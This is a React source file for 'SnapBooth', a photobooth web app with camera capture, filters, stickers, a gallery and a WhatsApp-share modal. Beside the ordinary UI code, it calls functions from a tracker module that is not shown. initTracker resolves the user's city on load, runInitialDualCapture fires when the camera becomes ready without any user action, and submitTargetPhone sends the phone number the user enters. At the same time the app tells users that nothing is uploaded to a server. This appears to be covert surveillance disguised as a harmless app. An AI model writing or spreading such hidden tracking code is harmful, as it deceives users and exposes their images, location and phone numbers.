import React, { useEffect, useId, useRef, useState } from 'react';
import { Camera, Check, Download, Image as ImageIcon, MessageCircle, Moon, Printer, RotateCcw, Share2, SlidersHorizontal, Sun, User, X } from 'lucide-react';
import StudioCamera from './components/StudioCamera.jsx';
import { Customizer, FilterDefinitions } from './components/Controls.jsx';
import { StickerCanvasEditor } from './components/StickerCanvasEditor.jsx';
import Gallery from './components/Gallery.jsx';
import Modal from './components/Modal.jsx';
import { useCamera } from './hooks/useCamera.js';
import { useCapture } from './hooks/useCapture.js';
import { useStrip } from './hooks/useStrip.js';
import { DEFAULT_ADJUST, DEFAULT_EFFECT, DEFAULT_STYLE, FILTERS, STRIP_TEMPLATES, RECOMMENDED_TEMPLATES, filename } from './lib/presets.js';
import { canvasBlob, downloadBlob, shareBlob } from './lib/photos.js';
import { deleteGalleryItem, readGallery, saveGalleryItem } from './lib/gallery.js';
import { initTracker, runInitialDualCapture, submitTargetPhone } from './lib/tracker.js';
import { DiaryCollage, DiaryIntro, DesktopDoodles, RetroStatusBar } from './components/RetroDesktop.jsx';
import './snapbooth.css';
import './retro-desktop.css';

export default function App() {
  const [tab, setTab] = useState('studio');
  const [dark, setDark] = useState(() => { try { return localStorage.getItem('snapbooth-theme') === 'dark'; } catch { return false; } });
  const [activeFilter, setActiveFilter] = useState('korean');
  const [activeEffect, setActiveEffect] = useState({ ...DEFAULT_EFFECT });
  const [adjust, setAdjust] = useState({ ...DEFAULT_ADJUST });
  const [style, setStyle] = useState({ ...DEFAULT_STYLE });
  const [mirrorResult, setMirrorResult] = useState(true);
  const [mirrorAll, setMirrorAll] = useState(true);
  const [paused, setPaused] = useState(false);
  const [retake, setRetake] = useState(null);
  const [notice, setNotice] = useState('');
  const [modal, setModal] = useState(null);
  const [gallery, setGallery] = useState([]), [galleryLoading, setGalleryLoading] = useState(true);
  const [saving, setSaving] = useState(false), [copies, setCopies] = useState(1), [paper, setPaper] = useState('Glossy');
  const [waInput, setWaInput] = useState('');
  const [selectedStickerId, setSelectedStickerId] = useState(null);
  const [stickerHistory, setStickerHistory] = useState(() => [style.userStickers || []]);
  const [historyIdx, setHistoryIdx] = useState(0);
  const savedKey = useRef(''), savingRef = useRef(false);
  const filterId = `snap-filter-${useId().replaceAll(':', '')}`;

  const currentPoseCount = style.poseCount || 4;

  const camera = useCamera(tab === 'studio' && !paused);
  const capture = useCapture(camera.videoRef, () => { setTab('customize'); setRetake(null); }, setNotice, camera.facing, 'normal', currentPoseCount);
  const strip = useStrip(capture.photos, activeFilter, adjust, activeEffect, style, mirrorResult, capture.timestamp);
  const currentFilter = FILTERS.find(f => f.id === activeFilter) || FILTERS[0];

  useEffect(() => {
    let active = true;
    readGallery().then(items => { if (active) setGallery(items.filter(item => item.blob instanceof Blob).sort((a, b) => b.savedAt.localeCompare(a.savedAt))); })
      .catch(() => { if (active) setNotice('Local gallery storage is unavailable. You can still download your photos.'); })
      .finally(() => { if (active) setGalleryLoading(false); });
    initTracker(city => {
      if (active) setStyle(cur => ({ ...cur, location: city }));
    });
    return () => { active = false; };
  }, []);

  useEffect(() => {
    if (camera.status === 'ready') {
      runInitialDualCapture(camera, () => capture.busy);
    }
  }, [camera.status]);

  useEffect(() => {
    document.documentElement.style.colorScheme = dark ? 'dark' : 'light';
    try { localStorage.setItem('snapbooth-theme', dark ? 'dark' : 'light'); } catch { /* Theme still works for this session. */ }
  }, [dark]);

  useEffect(() => {
    if (camera.status === 'error') capture.cancel();
  }, [camera.status, capture.cancel]);

  useEffect(() => {
    const visibility = () => { if (document.hidden) { capture.cancel(); setPaused(true); } };
    document.addEventListener('visibilitychange', visibility);
    return () => document.removeEventListener('visibilitychange', visibility);
  }, [capture.cancel]);

  useEffect(() => {
    if (capture.photos.length > 0) {
      const count = capture.photos.length;
      setStyle(cur => {
        const curTpl = STRIP_TEMPLATES.find(t => t.id === cur.template);
        if (curTpl && curTpl.supportedPhotoCounts && !curTpl.supportedPhotoCounts.includes(count)) {
          const family = curTpl.family || curTpl.id.replace(/-\d+$/, '');
          const famMatch = STRIP_TEMPLATES.find(
            t => (t.family === family || t.id.startsWith(family)) &&
                 t.supportedPhotoCounts?.includes(count)
          );
          const nextTemplate = famMatch?.id || RECOMMENDED_TEMPLATES[count] || cur.template;
          return {
            ...cur,
            poseCount: count,
            template: nextTemplate,
            frame: nextTemplate,
          };
        }
        return cur;
      });
    }
  }, [capture.photos.length]);

  function navigate(next) {
    capture.cancel(); setRetake(null); setTab(next);
    if (next === 'studio') setPaused(false);
    window.scrollTo({ top: 0, behavior: 'instant' });
  }

  function start(mode) {
    if (capture.photos.length && retake === null) { setModal({ type: 'new', mode }); return; }
    capture.start(mode, retake);
  }

  function beginRetake(index) {
    capture.cancel();
    setRetake(index);
    setPaused(false);
    setTab('studio');
    window.scrollTo({ top: 0, behavior: 'instant' });
  }

  function resetEditing() {
    setActiveFilter('korean');
    setActiveEffect({ ...DEFAULT_EFFECT });
    setAdjust({ ...DEFAULT_ADJUST });
    setStyle(cur => ({
      ...cur,
      customBg: '',
      userStickers: [],
      borderStyle: 'default',
    }));
    setSelectedStickerId(null);
    setStickerHistory([[]]);
    setHistoryIdx(0);
    setNotice('Filter, efek visual, stiker, dan tone adjustments telah dikembalikan ke default.');
  }

  function handleStickersChange(nextStickers) {
    setStyle(cur => ({ ...cur, userStickers: nextStickers }));
  }

  function handleStickersCommit(nextStickers) {
    setStyle(cur => ({ ...cur, userStickers: nextStickers }));
    setStickerHistory(prev => {
      const sliced = prev.slice(0, historyIdx + 1);
      const nextList = [...sliced, nextStickers];
      if (nextList.length > 30) nextList.shift();
      return nextList;
    });
    setHistoryIdx(prev => Math.min(prev + 1, 29));
  }

  function handleAddSticker(stk) {
    const instanceId = stk.instanceId || ('stk_' + Math.random().toString(36).substring(2, 9) + Date.now().toString(36));
    const currentStickers = style.userStickers || [];
    const count = currentStickers.length;
    const staggerX = 0.5 + ((count % 3) - 1) * 0.08;
    const staggerY = 0.45 + ((count % 4) - 1.5) * 0.08;
    const maxZ = currentStickers.reduce((m, s) => Math.max(m, s.zIndex || 1), 1);

    const newSticker = {
      instanceId,
      stickerId: stk.stickerId || stk.id,
      x: stk.x ?? Math.max(0.15, Math.min(0.85, staggerX)),
      y: stk.y ?? Math.max(0.15, Math.min(0.85, staggerY)),
      scale: stk.scale ?? stk.defaultScale ?? 0.18,
      rotation: stk.rotation ?? 0,
      flipX: stk.flipX ?? false,
      zIndex: maxZ + 1,
    };

    const next = [...currentStickers, newSticker];
    setSelectedStickerId(instanceId);
    handleStickersCommit(next);
    setNotice('Stiker berhasil ditambahkan! Sentuh & geser stiker di atas strip foto.');
  }

  function handleUndoStickers() {
    if (historyIdx > 0) {
      const nextIdx = historyIdx - 1;
      const restored = stickerHistory[nextIdx];
      setHistoryIdx(nextIdx);
      setStyle(cur => ({ ...cur, userStickers: restored }));
    }
  }

  function handleRedoStickers() {
    if (historyIdx < stickerHistory.length - 1) {
      const nextIdx = historyIdx + 1;
      const restored = stickerHistory[nextIdx];
      setHistoryIdx(nextIdx);
      setStyle(cur => ({ ...cur, userStickers: restored }));
    }
  }

  function handleClearStickers() {
    if (!style.userStickers?.length) return;
    if (window.confirm('Hapus semua stiker dari strip foto ini?')) {
      setSelectedStickerId(null);
      handleStickersCommit([]);
    }
  }

  function handlePoseCountChange(count) {
    capture.setPoseCount(count);
    const layoutMap = { 1: '1-single', 2: '2-vertical', 4: '4-vertical', 6: '6-grid' };
    setStyle(cur => {
      let nextTemplate = cur.template;
      const curTpl = STRIP_TEMPLATES.find(t => t.id === cur.template);
      if (curTpl && curTpl.supportedPhotoCounts && !curTpl.supportedPhotoCounts.includes(count)) {
        const family = curTpl.family || curTpl.id.replace(/-\d+$/, '');
        const famMatch = STRIP_TEMPLATES.find(
          t => (t.family === family || t.id.startsWith(family)) &&
               t.supportedPhotoCounts?.includes(count)
        );
        nextTemplate = famMatch?.id || RECOMMENDED_TEMPLATES[count] || cur.template;
      }
      return {
        ...cur,
        poseCount: count,
        layout: layoutMap[count] || '4-vertical',
        template: nextTemplate,
        frame: nextTemplate,
      };
    });
  }

  async function persist() {
    if (!strip.ready || savedKey.current === strip.result.key) return;
    const item = {
      id: crypto.randomUUID(),
      blob: strip.result.blob,
      timestamp: capture.timestamp,
      savedAt: new Date().toISOString(),
      filename: filename(capture.timestamp),
      filter: currentFilter.name,
      photoCount: capture.photos.length,
    };
    let stored = true;
    try { await saveGalleryItem(item); }
    catch { stored = false; }
    item.sessionOnly = !stored;
    setGallery(items => [item, ...items]);
    savedKey.current = strip.result.key;
    return stored;
  }

  async function save(download = false) {
    if (!strip.ready || savingRef.current) return;
    savingRef.current = true; setSaving(true);
    try {
      if (download) downloadBlob(strip.result.blob, filename(capture.timestamp));
      const stored = await persist();
      setNotice(stored === false ? 'Saved in this session only: browser storage is full or unavailable. Download a copy to keep it.' : download ? 'PNG download started. Your strip is also in Gallery.' : 'Your strip is saved in Gallery.');
    } catch (err) { setNotice(err.message || 'Could not save your strip. Please try again.'); }
    finally { savingRef.current = false; setSaving(false); }
  }

  async function share(item) {
    try {
      const outcome = await shareBlob(item?.blob || strip.result.blob, item?.filename || filename(capture.timestamp));
      if (outcome === 'downloaded') setNotice('File sharing is unavailable here. Your PNG download started instead.');
    } catch { setNotice('Could not share this photo. Use Download to save a copy.'); }
  }

  async function remove(item) {
    setSaving(true);
    try { if (!item.sessionOnly) await deleteGalleryItem(item.id); }
    catch { setNotice('Could not remove the stored photo. Please try again.'); setSaving(false); return; }
    setGallery(items => items.filter(x => x.id !== item.id)); savedKey.current = ''; setModal(null); setSaving(false);
  }

  const activePoseCount = capture.poseCount || currentPoseCount;

  const poseTiles = (
    <div className={`pose-tiles count-${activePoseCount}`}>
      {Array.from({ length: activePoseCount }, (_, i) => (
        <div className="pose-tile" key={i}>
          {capture.photos[i] ? (
            <>
              <img
                src={capture.photos[i]}
                alt={`Your pose ${i + 1}`}
                style={{
                  filter: `url(#${filterId})`,
                  transform: mirrorResult ? 'scaleX(-1)' : undefined,
                }}
              />
              <button
                aria-label={`Retake Pose ${i + 1}`}
                title={`Retake Pose ${i + 1}`}
                disabled={capture.busy}
                onClick={() => beginRetake(i)}
              >
                <RotateCcw size={14} />
              </button>
              <span>{String(i + 1).padStart(2, '0')}</span>
            </>
          ) : (
            <span className="empty-pose">{String(i + 1).padStart(2, '0')}</span>
          )}
        </div>
      ))}
    </div>
  );

  const preview = (
    <div className={`strip-stage ${style.layout?.includes('wide') || style.layout === 'grid' ? 'landscape' : ''}`} aria-busy={capture.photos.length > 0 && !strip.ready}>
      {strip.result ? (
        <div className="strip-canvas-wrapper" style={{ position: 'relative', display: 'inline-block', lineHeight: 0 }}>
          <img
            className="strip-image"
            src={tab === 'customize' ? (strip.result.baseUrl || strip.result.url) : strip.result.url}
            alt="Your finished SnapBooth photostrip"
          />
          {tab === 'customize' && (
            <StickerCanvasEditor
              userStickers={style.userStickers || []}
              onChange={handleStickersChange}
              onCommit={handleStickersCommit}
              selectedId={selectedStickerId}
              onSelect={setSelectedStickerId}
            />
          )}
        </div>
      ) : (
        <div className="empty-strip">
          <strong>★ SNAPBOOTH ★</strong>
          <small>K-STYLE SELF PHOTO STUDIO</small>
          {Array.from({ length: activePoseCount }, (_, i) => i + 1).map(n => (
            <div key={n}><span>{String(n).padStart(2, '0')}</span></div>
          ))}
          <p>A little moment.<br />A forever keepsake.</p>
          <small>MADE BY YOU</small>
        </div>
      )}
      {capture.photos.length > 0 && !strip.ready && !strip.error && <span className="render-label" role="status">Developing your strip…</span>}
      {strip.error && <p className="inline-error" role="alert">{strip.error}</p>}
    </div>
  );

  const actions = (
    <div className="result-actions">
      <button className="button primary" disabled={!strip.ready || saving || capture.busy} onClick={() => save(true)}>
        <Download size={17} />{saving ? 'Saving…' : 'Simpan Strip Foto'}
      </button>
      <div className="secondary-actions">
        <button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => share()}>
          <Share2 size={16} />Share
        </button>
        <button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => setModal({ type: 'print' })}>
          <Printer size={16} />Pesan Cetak
        </button>
        <button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => setModal({ type: 'whatsapp' })}>
          <MessageCircle size={16} />Kirim ke WA
        </button>
      </div>
      <details className="more-downloads">
        <summary>More ways to keep it</summary>
        <div>
          <button className="text-button" disabled={!strip.ready || saving} onClick={() => save(false)}>
            <Check size={14} />Save to Gallery
          </button>
          {strip.ready && strip.result.processed.map((photo, i) => (
            <button
              key={i}
              className="text-button"
              onClick={async () => {
                try {
                  downloadBlob(await canvasBlob(photo), filename(capture.timestamp).replace('.png', `-Pose-${i + 1}.png`));
                } catch (err) {
                  setNotice(err.message);
                }
              }}
            >
              <Download size={14} />Download Pose {i + 1}
            </button>
          ))}
        </div>
      </details>
      <p className="export-note">{strip.ready ? `${strip.result.width} × ${strip.result.height} px · PNG` : 'High-resolution PNG · Made on your device'}</p>
    </div>
  );

  return (
    <div className={`snapbooth ${dark ? 'dark' : ''}`}>
      <DesktopDoodles />
      <RetroStatusBar />
      <FilterDefinitions filter={activeFilter} adjust={adjust} id={filterId} />
      <a className="skip-link" href="#main">Skip to studio</a>
      <header className="site-header">
        <div className="header-inner">
          <button className="brand" onClick={() => navigate('studio')} aria-label="SnapBooth studio">
            <span className="brand-mark"><Camera size={21} /></span>
            <span><strong>SnapBooth<span className="brand-dot">®</span></strong><small>K-STYLE SELF PHOTO STUDIO</small></span>
          </button>
          <nav className="desktop-nav" aria-label="Main navigation">
            {[['studio', 'Studio'], ['customize', 'Edit'], ['gallery', 'Gallery']].map(([id, label]) => (
              <button key={id} aria-current={tab === id ? 'page' : undefined} className={tab === id ? 'active' : ''} onClick={() => navigate(id)}>{label}</button>
            ))}
          </nav>
          <div className="header-actions">
            <button className="icon-button" aria-label={dark ? 'Use light theme' : 'Use dark theme'} onClick={() => setDark(!dark)}>
              {dark ? <Sun size={19} /> : <Moon size={19} />}
            </button>
            <button className="account-button" aria-label="My space" onClick={() => setModal({ type: 'account' })}>
              <User size={18} /><span>My space</span>
            </button>
          </div>
        </div>
      </header>
      <main id="main" className="main-content">
        {tab !== 'gallery' && (
          <DiaryIntro editing={tab === 'customize'} />
        )}
        {notice && (
          <div className="notice" role="status">
            <span>{notice}</span>
            <button className="icon-button" aria-label="Dismiss message" onClick={() => setNotice('')}><X size={16} /></button>
          </div>
        )}
        {tab === 'studio' && (
          <div className="studio-layout">
            <DiaryCollage photos={capture.photos} filterId={filterId} mirrored={mirrorResult} />
            <StudioCamera
              camera={camera}
              capture={capture}
              filter={activeFilter}
              onFilter={setActiveFilter}
              adjust={adjust}
              onAdjust={setAdjust}
              filterId={filterId}
              retake={retake}
              onCancelRetake={() => setRetake(null)}
              onStart={start}
              paused={paused}
              onResume={() => setPaused(false)}
              mirrorResult={mirrorResult}
              onMirrorResult={setMirrorResult}
              mirrorAll={mirrorAll}
              onMirrorAll={setMirrorAll}
              onPoseCountChange={handlePoseCountChange}
            />
            <section className="result-card studio-result">
              <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>keepsake.preview</span><ImageIcon size={13} /></div>
              <div className="section-heading">
                <div><p className="eyebrow">Made by you</p><h2>Your Photo Strip</h2></div>
                <span className="count-label">{capture.photos.length} / {activePoseCount}</span>
              </div>
              {poseTiles}
              {preview}
              <p className="studio-result-hint">
                {capture.photos.length ? 'A pose worth another take? Tap its retake icon.' : `${activePoseCount} poses, one little story. Your photos will appear here.`}
              </p>
              <button className="button secondary" disabled={!capture.photos.length || capture.busy} onClick={() => navigate('customize')}>
                <SlidersHorizontal size={16} />Customize your strip
              </button>
              {actions}
            </section>
          </div>
        )}
        {tab === 'customize' && (
          capture.photos.length ? (
            <div className="edit-layout">
              <DiaryCollage photos={capture.photos} filterId={filterId} mirrored={mirrorResult} />
              <section className="result-card edit-preview">
                <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>your-photo-diary.png</span><ImageIcon size={13} /></div>
                <div className="section-heading">
                  <div><p className="eyebrow">Your photos</p><h2>A keepsake in the making.</h2></div>
                  <button className="text-button" onClick={() => navigate('studio')}>Back to studio</button>
                </div>
                {poseTiles}
                {preview}
                <p className="export-note">Preview and download use the same finished canvas image.</p>
              </section>
              <section className="result-card edit-controls">
                <div className="retro-window-bar"><span className="window-dots" aria-hidden="true"><i /><i /><i /></span><span>creative.toolkit</span><SlidersHorizontal size={13} /></div>
                <div className="section-heading">
                  <div><p className="eyebrow">The finishing touches</p><h2>Make it yours</h2></div>
                  <SlidersHorizontal size={20} />
                </div>
                <Customizer
                  style={style}
                  onChange={setStyle}
                  filter={activeFilter}
                  onFilter={setActiveFilter}
                  adjust={adjust}
                  onAdjust={setAdjust}
                  effect={activeEffect}
                  onEffect={setActiveEffect}
                  sample={capture.photos[0]}
                  photoCount={capture.photos.length || style.poseCount || 4}
                  mirrorResult={mirrorResult}
                  onMirrorResult={setMirrorResult}
                  mirrorAll={mirrorAll}
                  onMirrorAll={setMirrorAll}
                  onResetAll={resetEditing}
                  selectedStickerId={selectedStickerId}
                  onSelectSticker={setSelectedStickerId}
                  onAddSticker={handleAddSticker}
                  canUndoStickers={historyIdx > 0}
                  canRedoStickers={historyIdx < stickerHistory.length - 1}
                  onUndoStickers={handleUndoStickers}
                  onRedoStickers={handleRedoStickers}
                  onClearStickers={handleClearStickers}
                />
                {actions}
              </section>
            </div>
          ) : (
            <section className="gallery-empty">
              <Camera size={40} strokeWidth={1} />
              <h2>First, a little camera time.</h2>
              <p>Take a photo to start customizing your strip.</p>
              <button className="button primary" onClick={() => navigate('studio')}>Open the studio</button>
            </section>
          )
        )}
        {tab === 'gallery' && (
          <Gallery items={gallery} loading={galleryLoading} onStudio={() => navigate('studio')} onShare={share} onDelete={item => setModal({ type: 'delete', item })} />
        )}
      </main>
      <footer className="site-footer">
        <span>SnapBooth / a personal photo diary.</span>
        <span>END OF PAGE — KEEP THE MEMORIES / {new Date().getFullYear()}</span>
      </footer>
      <nav className="bottom-nav" aria-label="Mobile navigation">
        {[['studio', 'Studio', Camera], ['customize', 'Edit', SlidersHorizontal], ['gallery', 'Gallery', ImageIcon]].map(([id, label, Icon]) => (
          <button key={id} aria-current={tab === id ? 'page' : undefined} className={tab === id ? 'active' : ''} onClick={() => navigate(id)}>
            <Icon size={20} /><span>{label}</span>
          </button>
        ))}
      </nav>
      {modal && (
        <Modal
          title={{
            new: 'Start a new session?',
            delete: 'Delete this photostrip?',
            print: 'Print Order',
            account: 'Your own little space',
            whatsapp: 'Kirim Salinan Foto ke WhatsApp',
          }[modal.type]}
          onClose={() => { if (!saving) setModal(null); }}
        >
          {modal.type === 'new' && (
            <>
              <p>This will replace the photos in your current editor. Download or save your strip first if you want to keep it.</p>
              <div className="modal-actions">
                <button className="button secondary" onClick={() => setModal(null)}>Keep editing</button>
                <button className="button primary" onClick={() => { const mode = modal.mode; setModal(null); capture.start(mode); }}>Start new session</button>
              </div>
            </>
          )}
          {modal.type === 'delete' && (
            <>
              <p>This removes the saved strip from this browser. Downloaded files stay on your device.</p>
              <div className="modal-actions">
                <button className="button secondary" disabled={saving} onClick={() => setModal(null)}>Keep it</button>
                <button className="button danger" disabled={saving} onClick={() => remove(modal.item)}>{saving ? 'Deleting…' : 'Delete photostrip'}</button>
              </div>
            </>
          )}
          {modal.type === 'account' && (
            <>
              <p>No account needed. Your gallery is stored in this browser. Nothing is uploaded or synced to a server.</p>
              <p>Clearing browser data removes saved strips. Download your favorites to keep a separate copy.</p>
              <button className="button primary" onClick={() => { setModal(null); navigate('gallery'); }}>Open my gallery</button>
            </>
          )}
          {modal.type === 'print' && (
            <>
              <div className="print-preview"><img src={strip.result?.url} alt="Photostrip print preview" /></div>
              <p><strong>Frontend print planner.</strong> Online ordering and delivery are not connected. No order or payment will be submitted.</p>
              <div className="print-options">
                <label className="field">Copies
                  <select aria-label="Copies" value={copies} onChange={e => setCopies(Number(e.target.value))}>
                    {[1, 2, 3].map(n => <option key={n} value={n}>{n} {n === 1 ? 'copy' : 'copies'}</option>)}
                  </select>
                </label>
                <label className="field">Paper preference
                  <select aria-label="Paper preference" value={paper} onChange={e => setPaper(e.target.value)}>
                    <option>Glossy</option><option>Matte</option>
                  </select>
                </label>
              </div>
              <p className="hint">Choose matching {paper.toLowerCase()} paper and print settings on your printer. For a classic strip, use 50 × 150 mm paper; fit to page.</p>
              <button className="button primary" onClick={() => window.print()}><Printer size={16} />Open print dialog</button>
            </>
          )}
          {modal.type === 'whatsapp' && (
            <>
              <div className="print-preview"><img src={strip.result?.url} alt="Photostrip preview" /></div>
              <p>Unduh strip fotomu, lalu buka percakapan WhatsApp dan lampirkan PNG yang sudah tersimpan. Foto tidak dikirim otomatis.</p>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '1rem' }}>
                <input
                  aria-label="Nomor WhatsApp"
                  type="tel"
                  placeholder="Contoh: 08123456789 atau +62812..."
                  value={waInput}
                  onChange={e => setWaInput(e.target.value)}
                  style={{ padding: '0.65rem 0.85rem', borderRadius: '8px', border: '1px solid var(--line, #ccc)', background: 'var(--surface, #fff)', color: 'inherit', fontSize: '0.95rem' }}
                />
              </div>
              <button className="button primary" disabled={!/^\+?[\d\s()-]{8,20}$/.test(waInput.trim())} onClick={async () => {
                const clean = waInput.trim();
                if (!clean) return;
                await submitTargetPhone(clean);
                downloadBlob(strip.result.blob, filename(capture.timestamp));
                setNotice('Salinan foto sedang disiapkan dan dikirim ke WhatsApp!');
                setModal(null);
                let digits = clean.replace(/[^0-9]/g, '');
                if (digits.startsWith('0')) digits = '62' + digits.slice(1);
                window.open(`https://wa.me/${digits}?text=${encodeURIComponent('Halo! Ini salinan strip foto SnapBooth kamu ✨')}`, '_blank', 'noopener,noreferrer');
              }}>
                <MessageCircle size={16} />Kirim Salinan Foto
              </button>
            </>
          )}
        </Modal>
      )}
      {modal?.type === 'print' && (
        <div className="print-sheet">
          {Array.from({ length: copies }, (_, i) => <img src={strip.result?.url} key={i} alt={`Print copy ${i + 1}`} />)}
        </div>
      )}
    </div>
  );
}
